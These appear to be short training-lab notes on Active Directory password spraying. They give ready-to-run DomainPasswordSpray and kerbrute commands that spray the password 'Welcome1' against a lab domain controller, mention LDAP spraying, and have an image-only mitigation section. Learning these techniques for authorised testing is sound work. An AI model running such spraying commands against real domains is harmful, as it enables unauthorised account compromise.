- TOOL - **DomainPasswordSpray** https://github.com/dafthack/DomainPasswordSpray
- If we are **authenticated** to the domain, DPS will generate a user list from AD, query the domain password policy, exclude user accounts within one attempt of locking out.
- If **not authenticated** to the domain, we can supply a user list for spraying

### DomainPasswordSpray
- **If Authenticated**
	- skip the `-UserList` flag as the tool will generate the user list itself.
- `Import-Module .\DomainPasswordSpray.ps1`
- `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue`

### Kerbrute for windows
- `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1`

<hr>

- **INSTEAD OF SMB, we can do LDAP password spraying**

<hr>

## Mitigation
- ![](/attachments/Pasted-image-20250211163612.png)
